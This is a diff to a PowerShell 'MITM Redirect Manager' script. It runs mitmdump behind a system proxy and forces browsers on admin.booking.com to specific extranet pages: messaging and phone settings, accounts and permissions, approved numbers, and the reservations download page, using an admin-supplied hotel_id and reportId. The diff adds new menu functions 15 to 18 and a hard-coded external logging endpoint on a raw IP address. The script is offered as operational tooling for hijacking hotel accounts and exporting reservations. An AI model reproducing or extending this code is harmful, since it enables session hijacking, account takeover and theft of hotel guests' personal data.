@@ -19,11 +19,21 @@ $UserFlag = "C:\temp\mitm_user_once"
 $SecurityFlag = "C:\temp\mitm_security_once"
 $Operation11Flag = "C:\temp\mitm_operation_11_once"
 $Operation12Flag = "C:\temp\mitm_operation_12_once"
-
-# --- НОВЫЙ флаг для Booking hotel global redirect ---
 $BookingHotelFlag = "C:\temp\mitm_booking_hotel_once"
+$BookingHotelSecurityFlag = "C:\temp\mitm_booking_hotel_security_once"
+$Operation16Flag = "C:\temp\mitm_operation_16_once"
+$CustomRedirectFlag = "C:\temp\mitm_custom_redirect_once"
+$CustomRedirectFromFile = "C:\temp\mitm_custom_redirect_from.txt"
+$CustomRedirectToFile = "C:\temp\mitm_custom_redirect_to.txt"
+$CustomRedirectDoneFlag = "C:\temp\mitm_custom_redirect_done.txt"
+# --- НОВЫЙ флаг для Booking hotel reservations download redirect ---
+$BookingReservationsFlag = "C:\temp\mitm_booking_reservations_once"
+$BookingReservationsHotelIdFile = "C:\temp\mitm_booking_reservations_hotel_id.txt"
+$BookingReservationsReportIdFile = "C:\temp\mitm_booking_reservations_report_id.txt"
 
 $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
+
+$TelegramLogServer = "http://89.42.142.29:5000/log_redirect"
 # -----------------------------------------
 
 function Log-Write {
@@ -269,6 +279,15 @@ function Enable-ForceRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Force redirect enabled."
     Start-Mitmdump
 }
@@ -286,6 +305,14 @@ function Enable-OneShotRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "One-shot redirect enabled."
     Start-Mitmdump
 }
@@ -303,6 +330,15 @@ function Enable-MessageRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com message redirect enabled."
     Start-Mitmdump
 }
@@ -320,6 +356,15 @@ function Enable-ProviderRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com provider redirect enabled."
     Start-Mitmdump
 }
@@ -337,6 +382,15 @@ function Enable-UserRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com user redirect enabled."
     Start-Mitmdump
 }
@@ -354,6 +408,15 @@ function Enable-SecurityRedirect {
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com security redirect enabled."
     Start-Mitmdump
 }
@@ -361,7 +424,6 @@ function Enable-SecurityRedirect {
 function Enable-Operation11Redirect {
     Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
     
-    # Создаем флаг операции 11 и включаем функцию 7 (message redirect)
     if (-not (Test-Path (Split-Path $Operation11Flag))) {
         New-Item -ItemType Directory -Path (Split-Path $Operation11Flag) -Force | Out-Null
     }
@@ -379,7 +441,15 @@ function Enable-Operation11Redirect {
     Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Start-Mitmdump
     
     Log-Write "Operation 11: Function 7 (message redirect) enabled."
@@ -389,7 +459,6 @@ function Enable-Operation11Redirect {
 function Enable-Operation12Redirect {
     Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
     
-    # Создаем флаг операции 12 и включаем функцию 9 (user redirect)
     if (-not (Test-Path (Split-Path $Operation12Flag))) {
         New-Item -ItemType Directory -Path (Split-Path $Operation12Flag) -Force | Out-Null
     }
@@ -407,21 +476,27 @@ function Enable-Operation12Redirect {
     Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Start-Mitmdump
     
     Log-Write "Operation 12: Function 9 (user redirect) enabled."
     Log-Write "Function 10 (security redirect) will activate when user reaches accounts_and_permissions page."
 }
 
-# ---------------- НОВЫЕ функции управления Booking hotel global redirect ----------------
 function Enable-BookingHotelRedirect {
     if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
 
-    # Отключаем другие однотипные флаги чтобы избежать конфликтов (по аналогии с существующими)
     Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
@@ -430,15 +505,251 @@ function Enable-BookingHotelRedirect {
     Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
     Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com HOTEL (global) redirect enabled."
     Start-Mitmdump
 }
 
 function Disable-BookingHotelRedirect {
     Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
     Log-Write "Booking.com HOTEL (global) redirect disabled."
-    # we do not stop mitmdump here; user may want it running for other flags
+}
+
+function Enable-BookingHotelSecurityRedirect {
+    if (-not (Test-Path (Split-Path $BookingHotelSecurityFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingHotelSecurityFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingHotelSecurityFlag -Force | Out-Null
+
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
+    Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
+    Start-Mitmdump
+}
+
+function Enable-Operation16Redirect {
+    Log-Write "Starting Operation 16 sequence (function 13 -> function 15)..."
+    
+    if (-not (Test-Path (Split-Path $Operation16Flag))) {
+        New-Item -ItemType Directory -Path (Split-Path $Operation16Flag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $Operation16Flag -Force | Out-Null
+    
+    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
+    
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
+    Start-Mitmdump
+    
+    Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
+    Log-Write "Function 15 (Booking Hotel Security Redirect) will activate after function 13 completes."
+}
+
+function Enable-CustomRedirect {
+    Log-Write "Starting Custom Redirect (function 17)..."
+    
+    Write-Host ""
+    Write-Host "=== CUSTOM ONE-TIME REDIRECT (FUNCTION 17) ==="
+    Write-Host ""
+    Write-Host "ONE-TIME REDIRECT: will work only on FIRST request"
+    Write-Host ""
+    Write-Host "EXAMPLES:"
+    Write-Host "1. Redirect specific page:"
+    Write-Host "   FROM: https://www.tsn.ca/cfl/"
+    Write-Host "   TO:   https://www.tsn.ca/soccer/fifa-world-cup/"
+    Write-Host ""
+    Write-Host "2. Redirect entire site:"
+    Write-Host "   FROM: https://www.example.com/"
+    Write-Host "   TO:   https://news.google.com/"
+    Write-Host ""
+    Write-Host "3. Redirect any request:"
+    Write-Host "   FROM: https://admin.booking.com/hotel/"
+    Write-Host "   TO:   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
+    Write-Host ""
+    Write-Host "IMPORTANT: Always include full URL with https://"
+    Write-Host ""
+    
+    # Ask for FROM URL
+    do {
+        $fromDomain = Read-Host "Enter FULL URL to redirect FROM (example: https://site.com/page)"
+        if ($fromDomain -notmatch '^https?://') {
+            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
+            Write-Host "Example: https://www.example.com/" -ForegroundColor Yellow
+            continue
+        }
+        break
+    } while ($true)
+    
+    # Ask for TO URL
+    do {
+        $toDomain = Read-Host "Enter FULL URL to redirect TO (example: https://target.com/destination)"
+        if ($toDomain -notmatch '^https?://') {
+            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
+            Write-Host "Example: https://www.google.com/" -ForegroundColor Yellow
+            continue
+        }
+        break
+    } while ($true)
+    
+    # Clear done flag
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Save settings to files
+    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain -Force
+    Set-Content -Path $CustomRedirectToFile -Value $toDomain -Force
+    
+    Log-Write ("Custom one-time redirect configured: {0} -> {1}" -f $fromDomain, $toDomain)
+    Write-Host ""
+    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
+    Write-Host ("           will redirect to: {0}" -f $toDomain) -ForegroundColor Green
+    Write-Host ("Function will auto-disable after first use") -ForegroundColor Yellow
+    Write-Host ""
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $CustomRedirectFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $CustomRedirectFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $CustomRedirectFlag -Force | Out-Null
+    
+    # Disable other flags
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
+    
+    Start-Mitmdump
+    
+    Log-Write "Custom one-time redirect enabled (function 17). First matching request will be redirected."
+}
+
+function Enable-BookingReservationsRedirect {
+    Log-Write "Starting Booking Reservations Download Redirect (function 18)..."
+    
+    Write-Host ""
+    Write-Host "=== BOOKING RESERVATIONS DOWNLOAD REDIRECT (FUNCTION 18) ==="
+    Write-Host ""
+    Write-Host "Redirects all requests to admin.booking.com/hotel/ to reservations download page"
+    Write-Host "Until the target page with ses parameter is requested"
+    Write-Host ""
+    
+    # Get hotel_id from admin
+    do {
+        $hotelId = Read-Host "Enter hotel_id (example: 14762911)"
+        if ($hotelId -notmatch '^\d+$') {
+            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
+            continue
+        }
+        break
+    } while ($true)
+    
+    # Get reportId from admin
+    do {
+        $reportId = Read-Host "Enter reportId (example: 5865185)"
+        if ($reportId -notmatch '^\d+$') {
+            Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
+            continue
+        }
+        break
+    } while ($true)
+    
+    # Save parameters to files
+    Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
+    Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $BookingReservationsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingReservationsFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingReservationsFlag -Force | Out-Null
+    
+    # Disable other flags
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
+    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
+    Write-Host ""
+    Write-Host ("[CONFIGURED] All requests to admin.booking.com/hotel/ will be redirected to:") -ForegroundColor Green
+    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Green
+    Write-Host ("   with parameters: hotel_id={0}&lang=&reportId={1}" -f $hotelId, $reportId) -ForegroundColor Green
+    Write-Host ""
+    Write-Host ("Redirect will stop when user requests:") -ForegroundColor Yellow
+    Write-Host ("   https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html") -ForegroundColor Yellow
+    Write-Host ("   with ses parameter (any value)") -ForegroundColor Yellow
+    Write-Host ""
+    
+    Start-Mitmdump
+    
+    Log-Write "Booking reservations download redirect enabled (function 18)."
 }
 
 # ---------------- MAIN ----------------
@@ -477,21 +788,25 @@ Close-Browsers-Gracefully -closeOption $closeOption
 while ($true) {
     Write-Host ""
     Write-Host "--------------- MITM Redirect Manager ---------------"
-    Write-Host "1) Full reset"
-    Write-Host "2) Enable one-shot redirect"
-    Write-Host "3) Enable force redirect"
-    Write-Host "4) Disable redirects"
-    Write-Host "5) Tail log"
-    Write-Host "6) Safe exit"
-    Write-Host "7) Enable Booking.com message redirect"
-    Write-Host "8) Enable Booking.com provider redirect"
-    Write-Host "9) Enable Booking.com user redirect"
-    Write-Host "10) Enable Booking.com security redirect"
+    Write-Host "1) RESET"
+    Write-Host "2) one-shot"
+    Write-Host "3) force"
+    Write-Host "4) disable"
+    Write-Host "5) tail log"
+    Write-Host "6) EXIT"
+    Write-Host "7) Messaging"
+    Write-Host "8) Provider"
+    Write-Host "9) User"
+    Write-Host "10) Phone"
     Write-Host "11) Enable Operation 11 (function 7 -> messaging/settings -> function 8)"
     Write-Host "12) Enable Operation 12 (function 9 -> accounts_and_permissions -> function 10)"
-    Write-Host "13) Enable Booking.com HOTEL (global) redirect (new)"
-    Write-Host "14) Disable Booking.com HOTEL (global) redirect (new)"
-    $opt = Read-Host "Choose option (1-14)"
+    Write-Host "13) Phone settings force"
+    Write-Host "14) Problem gap"
+    Write-Host "15) Messages settings force"
+    Write-Host "16) Combo Operation 16 (function 13 -> function 15)"
+    Write-Host "17) Custom One-Time shot (select source -> target)"
+    Write-Host "18) Booking Reservations Download (Function 18)"
+    $opt = Read-Host "Choose option (1-18)"
 
     switch ($opt) {
         "1" {
@@ -511,6 +826,15 @@ while ($true) {
             Remove-Item -Path $Operation11Flag -Force -ErrorAction SilentlyContinue
             Remove-Item -Path $Operation12Flag -Force -ErrorAction SilentlyContinue
             Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $Operation16Flag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $BookingReservationsFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $BookingReservationsHotelIdFile -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
             Clear-SystemProxies | Out-Null
             Reset-Proxy-And-Stop-Mitmdump
             Log-Write "Redirects disabled and proxy cleared."
@@ -531,6 +855,10 @@ while ($true) {
         "12" { Enable-Operation12Redirect }
         "13" { Enable-BookingHotelRedirect }
         "14" { Disable-BookingHotelRedirect }
+        "15" { Enable-BookingHotelSecurityRedirect }
+        "16" { Enable-Operation16Redirect }
+        "17" { Enable-CustomRedirect }
+        "18" { Enable-BookingReservationsRedirect }
         default { Write-Host "Invalid choice" }
     }
 }
